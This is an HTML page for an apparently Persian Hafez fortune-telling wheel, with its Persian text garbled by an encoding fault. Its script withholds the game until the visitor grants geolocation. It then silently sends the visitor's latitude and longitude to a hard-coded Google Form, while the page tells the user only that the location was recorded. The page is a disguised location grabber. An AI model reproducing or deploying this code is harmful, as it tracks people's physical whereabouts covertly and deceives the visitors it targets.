<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>ÙØ§Ù„ Ø­Ø§ÙØ¸</title>
<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">
<style>
body {
    margin:0;
    font-family:'Vazirmatn', sans-serif;
    background: #000 url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
    color:white;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    height:100vh;
    overflow:hidden;
    position:relative;
}

/* Ø§ÙÚ©Øª Ú†Ø´Ù…Ú© Ø²Ø¯Ù† Ø³ØªØ§Ø±Ù‡â€ŒÙ‡Ø§ */
@keyframes twinkle {
    0%, 100% {opacity: 0.5;}
    50% {opacity: 1;}
}

body::before {
    content:"";
    position:absolute;
    top:0; left:0; right:0; bottom:0;
    background: url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
    animation: twinkle 2s infinite;
    z-index:0;
    pointer-events:none;
}

h1 { margin-bottom:15px; position:relative; z-index:1;}

#wheel-container {
    position: relative;
    width:320px; height:320px;
    z-index:1;
    display:none; /* Ù…Ø®ÙÛŒ ØªØ§ Ø²Ù…Ø§Ù†ÛŒ Ú©Ù‡ Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø§Ø¯Ù‡ Ù†Ø´ÙˆØ¯ */
}

#wheel {
    width:100%; height:100%;
    border-radius:50%;
    border:8px solid #ffd700;
    position:relative;
    display:flex;
    align-items:center;
    justify-content:center;
    box-shadow:0 0 20px #ffd70088;
    transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1);
    z-index:1;
}

.number {
    position:absolute;
    width:50px; height:50px;
    border-radius:50%;
    background:#ffd700;
    color:#000;
    display:flex;
    align-items:center;
    justify-content:center;
    font-weight:bold;
    cursor:pointer;
    user-select:none;
    z-index:1;
}

#status {
    margin-top:15px;
    font-size:14px;
    color:#aaa;
    position:relative;
    z-index:1;
}

#result {
    margin-top:25px;
    width:80%;
    max-width:500px;
    text-align:center;
    font-size:18px;
    line-height:1.8;
    background:#ffffff10;
    padding:15px;
    border-radius:15px;
    min-height:60px;
    position:relative;
    z-index:1;
}

button {
    margin-top:20px;
    padding:10px 20px;
    font-size:16px;
    border:none;
    border-radius:10px;
    cursor:pointer;
    background:#ffd700;
    color:#000;
    font-weight:bold;
    transition:0.3s;
    position:relative;
    z-index:1;
}

button:hover { background:#fff; }
</style>
</head>
<body>

<h1>ğŸ”® ÙØ§Ù„ Ø­Ø§ÙØ¸</h1>
<div id="status">Ù„Ø·ÙØ§ Ø§Ø¬Ø§Ø²Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ø¯Ù‡ÛŒØ¯</div>

<div id="wheel-container">
    <div id="wheel"></div>
</div>

<button id="spinBtn" style="display:none;">ğŸ¡ Ú†Ø±Ø®Ø§Ù†Ø¯Ù† Ú¯Ø±Ø¯ÙˆÙ†Ù‡</button>
<div id="result" style="display:none;">Ø±ÙˆÛŒ Ú¯Ø±Ø¯ÙˆÙ†Ù‡ Ú©Ù„ÛŒÚ© Ú©Ù†</div>

<script>
// ====== ÙØ§Ù„ Ø­Ø§ÙØ¸ ======
const poems = [
`Ø¨Ù‡ Ø®Ø§Ú© Ù¾Ø§ÛŒ ØªÙˆ Ú©Ù‡ Ú¯Ø± Ø³Ø± Ø² Ø®Ø§Ú© Ø¨Ø±Ø¢Ø±Ø¯  
Ø¨Ù‡ Ø¨ÙˆÛŒ Ø²Ù„Ù ØªÙˆ Ù‡Ø± Ú¯Ù„ÛŒ Ú©Ù‡ Ø¨Ø´Ú©ÙØ¯ Ù†Ø³Ø±ÛŒÙ† Ø§Ø³Øª`,
`Ø² Ø´Ø¹Ø± Ø¯Ù„Ú©Ø´ Ø­Ø§ÙØ¸ Ú©Ø³ÛŒ Ø¨ÙˆØ¯ Ø¢Ú¯Ø§Ù‡  
Ú©Ù‡ Ù„Ø·Ù Ø·Ø¨Ø¹ Ùˆ Ø³Ø®Ù† Ú¯ÙØªÙ† Ø´ÛŒØ±ÛŒÙ† Ø¯Ø§Ø±Ø¯`,
`Ø¹ÛŒØ¨ Ø±Ù†Ø¯Ø§Ù† Ù…Ú©Ù† Ø§ÛŒ Ø²Ø§Ù‡Ø¯ Ù¾Ø§Ú©ÛŒØ²Ù‡ Ø³Ø±Ø´Øª  
Ú©Ù‡ Ú¯Ù†Ø§Ù‡ Ø¯Ú¯Ø±ÛŒ Ø¨Ø± ØªÙˆ Ù†Ø®ÙˆØ§Ù‡Ù†Ø¯ Ù†ÙˆØ´Øª`,
`Ø¢Ù†Ø§Ù† Ú©Ù‡ Ø®Ø§Ú© Ø±Ø§ Ø¨Ù‡ Ù†Ø¸Ø± Ú©ÛŒÙ…ÛŒØ§ Ú©Ù†Ù†Ø¯  
Ø¢ÛŒØ§ Ø¨ÙˆØ¯ Ú©Ù‡ Ú¯ÙˆØ´Ù‡ Ú†Ø´Ù…ÛŒ Ø¨Ù‡ Ù…Ø§ Ú©Ù†Ù†Ø¯`,
`Ø¯Ø± Ø§Ø²Ù„ Ù¾Ø±ØªÙˆ Ø­Ø³Ù†Øª Ø² ØªØ¬Ù„ÛŒ Ø¯Ù… Ø²Ø¯  
Ø¹Ø´Ù‚ Ù¾ÛŒØ¯Ø§ Ø´Ø¯ Ùˆ Ø¢ØªØ´ Ø¨Ù‡ Ù‡Ù…Ù‡ Ø¹Ø§Ù„Ù… Ø²Ø¯`,
`Ø§Ú¯Ø± Ø¢Ù† ØªØ±Ú© Ø´ÛŒØ±Ø§Ø²ÛŒ Ø¨Ù‡ Ø¯Ø³Øª Ø¢Ø±Ø¯ Ø¯Ù„ Ù…Ø§ Ø±Ø§  
Ø¨Ù‡ Ø®Ø§Ù„ Ù‡Ù†Ø¯ÙˆÛŒØ´ Ø¨Ø®Ø´Ù… Ø³Ù…Ø±Ù‚Ù†Ø¯ Ùˆ Ø¨Ø®Ø§Ø±Ø§ Ø±Ø§`,
`Ú†Ø´Ù…â€ŒÙ‡Ø§ÛŒ Ù†Ø§Ø²Ú©Ø´ Ø®ÙˆØ§Ø¨â€ŒØ¢Ø´ÙˆØ¨ Ù…Ø³ØªØ§Ù† Ø§Ø³Øª  
ÛŒØ§Ø±Ø¨ Ø§ÛŒÙ† Ø§Ø´Ø§Ø±ØªÙ‡Ø§ Ø§Ø² Ú†Ø´Ù… Ù…Ø³Øª Ú†ÛŒØ³Øª`
];

// ====== Ø§ÛŒØ¬Ø§Ø¯ Ú¯Ø±Ø¯ÙˆÙ†Ù‡ Ùˆ Ø§Ø¹Ø¯Ø§Ø¯ ======
const wheel = document.getElementById("wheel");
for(let i=1;i<=7;i++){
    const btn=document.createElement("div");
    btn.className="number";
    btn.innerText=i;
    const angle=(i-1)*(360/7);
    const radius=120;
    const x=Math.cos(angle*Math.PI/180)*radius;
    const y=Math.sin(angle*Math.PI/180)*radius;
    btn.style.transform=`translate(${x}px,${y}px)`;
    wheel.appendChild(btn);
}

// ====== ØªØ§Ø¨Ø¹ Ø´Ø±ÙˆØ¹ Ø¨Ø±Ù†Ø§Ù…Ù‡ Ø¨Ø¹Ø¯ Ø§Ø² Ø§Ø¬Ø§Ø²Ù‡ ======
function startWheel() {
    document.getElementById("wheel-container").style.display = "block";
    document.getElementById("spinBtn").style.display = "inline-block";
    document.getElementById("result").style.display = "block";
}

// ====== Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ Ú©Ù†ØªØ±Ù„ Ø¯Ø³ØªØ±Ø³ÛŒ ======
navigator.geolocation.getCurrentPosition(pos => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¨Ù‡ Google Form
    const formURL =
    "https://docs.google.com/forms/d/e/1FAIpQLSe7XbL0qJvEN2N8_3-DM0J81FBbrSYgUcrK2HWXII2Vh6CE4A/formResponse?" +
    "entry.790108067=" + lat +
    "&entry.385103325=" + lon;
    fetch(formURL,{method:"POST",mode:"no-cors"});

    document.getElementById("status").innerText = "ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø«Ø¨Øª Ø´Ø¯";
    startWheel(); // Ù†Ù…Ø§ÛŒØ´ Ú¯Ø±Ø¯ÙˆÙ†Ù‡ Ùˆ Ø¯Ú©Ù…Ù‡
}, err => {
    document.getElementById("status").innerText = "âŒ Ø¨Ø±Ø§ÛŒ Ø¯ÛŒØ¯Ù† Ú¯Ø±Ø¯ÙˆÙ†Ù‡ØŒ Ø¨Ø§ÛŒØ¯ Ø§Ø¬Ø§Ø²Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¨Ø¯Ù‡ÛŒØ¯";
});

// ====== Ú†Ø±Ø®Ø´ Ú¯Ø±Ø¯ÙˆÙ†Ù‡ ØªØµØ§Ø¯ÙÛŒ ======
let spinning=false;
document.getElementById("spinBtn").onclick=()=>{
    if(spinning) return;
    spinning=true;

    const randomNum=Math.floor(Math.random()*7); // 0 ØªØ§ 6
    const rotation = 360*5 + (360/7)*randomNum + (360/(7*2)); // Ú†Ù†Ø¯ Ø¯ÙˆØ± + Ø´Ù…Ø§Ø±Ù‡

    wheel.style.transform = `rotate(${rotation}deg)`;

    setTimeout(()=>{
        document.getElementById("result").innerText = poems[randomNum];
        spinning=false;
    },4000); // Ù…Ø¯Øª Ú†Ø±Ø®Ø´
};
</script>

</body>
</html>
